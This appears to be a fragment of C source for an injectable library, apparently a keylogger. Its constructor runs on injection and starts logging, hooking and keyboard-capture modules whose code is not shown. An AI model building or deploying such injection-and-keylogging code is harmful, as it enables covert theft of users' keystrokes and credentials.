#include "hooker.h"
#include "keyboard.h"
#include "rec_notificator.h"

/*
 * loadMsg()
 *
 * This function is automatically called when library is injected into a process.
 *
 */

__attribute__((constructor))
void loadMsg()
{
    log_init();
    rec_notificator_init();
	hooker_init();

    keyboard_init();
}